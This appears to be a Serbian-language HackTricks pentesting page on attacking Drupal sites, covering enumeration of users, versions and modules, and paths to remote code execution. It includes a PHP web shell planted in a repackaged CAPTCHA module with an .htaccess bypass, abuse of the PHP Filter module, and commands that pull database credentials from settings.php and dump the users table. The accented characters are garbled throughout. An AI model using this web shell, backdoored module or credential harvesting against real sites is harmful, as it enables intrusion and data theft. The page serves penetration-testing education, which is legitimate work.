# Drupal

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Otkrivanje

* Proverite **meta**
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **캛vor**: Drupal **indeksira svoj sadr쬬j koriste캖i 캜vorove**. 캛vor mo쬰 **sadr쬬vati bilo 코ta**, kao 코to su blog objava, anketa, 캜lanak, itd. URI stranica obi캜no ima oblik `/node/<nodeid>`.
```bash
curl drupal-site.com/node/1
```
## Enumeracija

Drupal podrazumevano podr쬬va **tri vrste korisnika**:

1. **`Administrator`**: Ovaj korisnik ima potpunu kontrolu nad Drupal veb sajtom.
2. **`Autentifikovani korisnik`**: Ovi korisnici mogu se prijaviti na veb sajt i obavljati operacije kao 코to su dodavanje i ure캠ivanje 캜lanaka na osnovu svojih dozvola.
3. **`Anonimni`**: Svi posetioci veb sajta su ozna캜eni kao anonimni. Podrazumevano, ovi korisnici imaju samo dozvolu za 캜itanje objava.

### Verzija

* Proverite `/CHANGELOG.txt`
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
Novije instalacije Drupal-a po default-u blokiraju pristup datotekama `CHANGELOG.txt` i `README.txt`.
{% endhint %}

### Enumeracija korisni캜kih imena

#### Registracija

Na _/user/register_ poku코ajte kreirati korisni캜ko ime i ako je ime ve캖 zauzeto, bi캖ete obave코teni:

![](<../../.gitbook/assets/image (254).png>)

#### Zahtev za novu lozinku

Ako zatra쬴te novu lozinku za postoje캖e korisni캜ko ime:

![](<../../.gitbook/assets/image (255).png>)

Ako zatra쬴te novu lozinku za nepostoje캖e korisni캜ko ime:

![](<../../.gitbook/assets/image (256).png>)

### Dobijanje broja korisnika

Pristupanjem _/user/\<broj>_ mo쬰te videti broj postoje캖ih korisnika, u ovom slu캜aju je 2 jer _/users/3_ vra캖a gre코ku "nije prona캠eno":

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### Skrivene stranice

**Fuzzujte `/node/$` gde je `$` broj** (od 1 do 500 na primer).\
Mo쬰te prona캖i **skrivene stranice** (test, dev) koje nisu referencirane od strane pretra쬴va캜a.

#### Informacije o instaliranim modulima
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### Automatsko

Automatsko skeniranje i ispitivanje Drupal veb aplikacija mo쬰 biti veoma korisno za otkrivanje ranjivosti i slabosti. Postoje alati kao 코to su Droopescan i Drupalgeddon koji mogu automatizovati ovaj proces.

Droopescan je alat koji omogu캖ava skeniranje Drupal veb aplikacija kako bi se otkrile ranjivosti. Mo쬰 se koristiti za pronala쬰nje verzije Drupal-a, provere poznatih ranjivosti i pronala쬰nje dodataka koji mogu biti ranjivi.

Drupalgeddon je alat koji je specifi캜no dizajniran za otkrivanje ranjivosti poznate kao "Drupalgeddon". Ova ranjivost omogu캖ava napada캜ima da izvr코e proizvoljan kod na ciljnom sistemu. Alat automatski skenira ciljnu veb aplikaciju i proverava da li je ranjiva na ovu ranjivost.

Automatsko skeniranje i ispitivanje Drupal veb aplikacija mo쬰 biti brzo i efikasno, ali treba biti oprezan prilikom kori코캖enja ovih alata. Neophodno je dobiti dozvolu od vlasnika veb aplikacije pre nego 코to se izvr코i skeniranje ili ispitivanje.
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### Pomo캖u PHP Filter modula

{% hint style="warning" %}
U starijim verzijama Drupal-a **(pre verzije 8)** bilo je mogu캖e prijaviti se kao administrator i **omogu캖iti modul `PHP filter`**, koji "Omogu캖ava evaluaciju ugra캠enog PHP koda/snippetova."
{% endhint %}

Potrebno je da je **dodatak php instaliran** (proverite pristupom do _/modules/php_ i ako vrati **403**, onda **postoji**, ako **nije prona캠en**, onda **dodatak php nije instaliran**)

Idite na _Modules_ -> (**Proverite**) _PHP Filter_ -> _Save configuration_

![](<../../.gitbook/assets/image (247) (1).png>)

Zatim kliknite na _Add content_ -> Izaberite _Basic Page_ ili _Article_ -> Napi코ite _php shellcode u telu_ -> Izaberite _PHP code_ u _Text formatu_ -> Izaberite _Preview_

![](<../../.gitbook/assets/image (253) (1).png>)

Na kraju samo pristupite novo kreiranom 캜voru:
```bash
curl http://drupal-site.local/node/3
```
### Instaliranje PHP Filter modula

Od verzije **8 nadalje, modul** [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **nije instaliran po defaultu**. Da bismo iskoristili ovu funkcionalnost, moramo **samostalno instalirati modul**.

1. Preuzmite najnoviju verziju modula sa Drupal veb sajta.
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. Nakon preuzimanja, idite na **`Administracija`** > **`Izve코taji`** > **`Dostupna a쬿riranja`**.
3. Kliknite na **`Pregledaj`**`, izaberite fajl iz direktorijuma u koji ste ga preuzeli, a zatim kliknite na **`Instaliraj`**.
4. Kada se modul instalira, mo쬰mo kliknuti na **`Sadr쬬j`** i **kreirati novu osnovnu stranicu**, sli캜no kao 코to smo uradili u primeru za Drupal 7. Ponovo se uverite da ste **izabrali `PHP kod` iz padaju캖eg menija `Format teksta`**.

### Modul sa zadnjim vratima

Modul sa zadnjim vratima mo쬰 se kreirati **dodavanjem 코koljke postoje캖em modulu**. Moduli se mogu prona캖i na drupal.org veb sajtu. Hajde da izaberemo modul kao 코to je [CAPTCHA](https://www.drupal.org/project/captcha). Pomerite se nadole i kopirajte link za tar.gz [arhivu](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz).

* Preuzmite arhivu i izvucite njene sadr쬬je.
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* Napravite **PHP web shell** sa slede캖im sadr쬬jem:
```php
<?php
system($_GET["cmd"]);
?>
```
* Zatim, trebamo kreirati **`.htaccess`** datoteku kako bismo sebi omogu캖ili pristup folderu. Ovo je neophodno jer Drupal zabranjuje direktni pristup folderu **`/modules`**.
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* Konfiguracija iznad 캖e primeniti pravila za fasciklu / kada zahtevamo datoteku u /modules. Kopirajte oba ova fajla u fasciklu captcha i napravite arhivu.
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* Pretpostavljaju캖i da imamo **administrativni pristup** veb sajtu, kliknite na **`Upravljanje`** a zatim na **`Pro코irenja`** na bo캜noj traci. Zatim kliknite na dugme **`+ Instaliraj novo pro코irenje`**, i bi캖emo preusmereni na stranicu za instalaciju, kao 코to je `http://drupal-site.local/admin/modules/install`. Pregledajte arhivu sa zaka캜enim Captcha i kliknite na **`Instaliraj`**.
* Nakon uspe코ne instalacije, pregledajte **`/modules/captcha/shell.php`** da biste izvr코ili komande.

## Post Eksploatacija

### Pro캜itajte settings.php
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### Dump korisnika iz baze podataka

Da biste izvr코ili izvla캜enje korisnika iz baze podataka, mo쬰te koristiti slede캖e korake:

1. Identifikujte ciljnu bazu podataka u Drupalu.
2. Koristite odgovaraju캖i alat za izvr코avanje SQL upita na bazi podataka, kao 코to je phpMyAdmin ili MySQL komandna linija.
3. Izvr코ite slede캖i SQL upit kako biste izvukli informacije o korisnicima:

```sql
SELECT * FROM users;
```

Ovaj upit 캖e vam vratiti sve informacije o korisnicima iz tabele "users" u bazi podataka.

4. Sa캜uvajte rezultate upita u odgovaraju캖u datoteku kako biste ih kasnije analizirali.

Napomena: Budite pa쬷jivi prilikom rukovanja ovim informacijama, jer pristup korisni캜kim podacima mo쬰 biti nezakonit ili kr코iti privatnost korisnika. Uvek se pridr쬬vajte eti캜kih smernica i zakona prilikom izvr코avanja ovih koraka.
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## Reference

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju ogla코enu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 游냕 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
